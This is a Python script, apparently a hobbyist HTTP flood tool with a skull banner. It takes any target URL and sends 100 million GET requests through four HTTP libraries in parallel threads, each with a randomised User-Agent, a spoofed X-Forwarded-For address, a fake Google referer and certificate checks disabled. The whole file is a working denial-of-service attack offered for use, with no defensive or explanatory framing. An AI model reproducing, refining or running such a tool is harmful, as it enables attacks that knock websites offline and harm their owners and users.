import requests
import threading
import httpx
import aiohttp
import asyncio
from user_agent import generate_user_agent
from random import randint
import urllib3
import subprocess
import sys
import os

Tamer1 = '\x1b[1;31m'  
Tamer2 = '\x1b[1;32m'  
l=(f'''{Tamer1}
        ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶           
      ¶¶¶¶¶¶     🧠       ¶¶¶¶¶¶         
     ¶¶¶¶¶                 ¶¶¶¶¶¶       
    ¶¶¶¶                     ¶¶¶¶¶      
   ¶¶¶¶                       ¶¶¶¶¶     
  ¶¶¶¶     ¶¶¶¶       ¶¶¶¶      ¶¶¶     
  ¶¶¶     ¶¶🔥¶¶     ¶¶🔥¶¶     ¶¶¶¶    
 ¶¶¶¶     ¶¶¶¶¶¶     ¶¶¶¶¶¶      ¶¶¶    
 ¶¶¶       ¶¶¶¶       ¶¶¶¶       ¶¶¶¶   
 ¶¶¶                              ¶¶¶   
 ¶¶¶                              ¶¶¶   
 ¶¶¶             🩸🩸              ¶¶¶   
 ¶¶¶            ¶¶¶¶¶            ¶¶¶¶   
 ¶¶¶¶        ¶¶¶¶¶¶¶¶¶¶¶         ¶¶¶    
  ¶¶¶      ¶¶¶¶¶     ¶¶¶¶¶      ¶¶¶¶    
  ¶¶¶¶    ¶¶¶           ¶¶¶    ¶¶¶¶     
   ¶¶¶¶   ¶¶     🚫       ¶¶   ¶¶¶¶      
    ¶¶¶¶                    ¶¶¶¶¶       
     ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶        
       ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
''')
print(l)
required_libraries = [
    "requests",
    "threading",
    "httpx",
    "aiohttp",
    "asyncio",
    "user_agent",
    "urllib3"
]

def install_and_import(library):
    try:
        __import__(library)
    except ModuleNotFoundError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", library])
for lib in required_libraries:
    install_and_import(lib)
import requests
import threading
import httpx
import aiohttp
import asyncio
from user_agent import generate_user_agent
from random import randint
import urllib3

session = requests.Session()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def Tamer_generate_ip():
    return f"{randint(1, 255)}.{randint(1, 255)}.{randint(1, 255)}.{randint(1, 255)}"

def Tamer_requests(target_url, Tamer_num):
    Tamer_session = requests.Session()
    for _ in range(Tamer_num):
        Tamer_headers = {
            'User-Agent': generate_user_agent(),
            'X-Forwarded-For': Tamer_generate_ip(),
            'Referer': 'https://google.com',
            'Connection': 'keep-alive'
        }
        try:
            Tamer_response = Tamer_session.get(target_url, headers=Tamer_headers, timeout=3, verify=False)
            print(f"{Tamer2}Requests: Attack Sent | Status : {Tamer_response.status_code} | Fake IP: {Tamer_headers['X-Forwarded-For']}")
        except requests.exceptions.RequestException as Tamer_error:
            print(f"{Tamer1}Requests Error: {Tamer_error}")

def Tamer_httpx(target_url, Tamer_num):
    with httpx.Client(verify=False) as Tamer_client:
        for _ in range(Tamer_num):
            Tamer_headers = {
                'User-Agent': generate_user_agent(),
                'X-Forwarded-For': Tamer_generate_ip(),
                'Referer': 'https://google.com',
                'Connection': 'keep-alive'
            }
            try:
                Tamer_response = Tamer_client.get(target_url, headers=Tamer_headers, timeout=3)
                print(f"{Tamer2}HTTPX: Attack Sent | Status : {Tamer_response.status_code} | Fake IP: {Tamer_headers['X-Forwarded-For']}")
            except httpx.RequestError as Tamer_error:
                print(f"{Tamer1}HTTPX Error: {Tamer_error}")

async def Tamer_aiohttp(target_url, Tamer_num):
    Tamer_connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=Tamer_connector) as Tamer_session:
        for _ in range(Tamer_num):
            Tamer_headers = {
                'User-Agent': generate_user_agent(),
                'X-Forwarded-For': Tamer_generate_ip(),
                'Referer': 'https://google.com',
                'Connection': 'keep-alive'
            }
            try:
                async with Tamer_session.get(target_url, headers=Tamer_headers, timeout=3) as Tamer_response:
                    print(f"{Tamer2}AIOHTTP: Attack Sent | Status : {Tamer_response.status} | Fake IP: {Tamer_headers['X-Forwarded-For']}")
            except aiohttp.ClientError as Tamer_error:
                print(f"{Tamer1}AIOHTTP Error: {Tamer_error}")

def Tamer_urllib3(target_url, Tamer_num):
    Tamer_http = urllib3.PoolManager(cert_reqs='CERT_NONE')
    for _ in range(Tamer_num):
        Tamer_headers = {
            'User-Agent': generate_user_agent(),
            'X-Forwarded-For': Tamer_generate_ip(),
            'Referer': 'https://google.com',
            'Connection': 'keep-alive'
        }
        try:
            Tamer_response = Tamer_http.request('GET', target_url, headers=Tamer_headers, timeout=3)
            print(f"{Tamer2}URLLIB3: Attack Sent | Status : {Tamer_response.status} | Fake IP: {Tamer_headers['X-Forwarded-For']}")
        except urllib3.exceptions.RequestError as Tamer_error:
            print(f"{Tamer1}URLLIB3 Error: {Tamer_error}")

def Tamer_ddos(target_url, Tamer_num):
    Tamer_num_per_library = Tamer_num // 4

    Tamer_threads = [
        threading.Thread(target=Tamer_requests, args=(target_url, Tamer_num_per_library)),
        threading.Thread(target=Tamer_httpx, args=(target_url, Tamer_num_per_library)),
        threading.Thread(target=Tamer_urllib3, args=(target_url, Tamer_num_per_library)),
        threading.Thread(target=lambda: asyncio.run(Tamer_aiohttp(target_url, Tamer_num_per_library)))
    ]

    for Tamer_thread in Tamer_threads:
        Tamer_thread.start()

    for Tamer_thread in Tamer_threads:
        Tamer_thread.join()

if __name__ == "__main__":
    Tamer_url = input(f"{Tamer2} URL: {Tamer1}")
    Tamer_total_requests = 100_000_000  
    Tamer_ddos(Tamer_url, Tamer_total_requests)
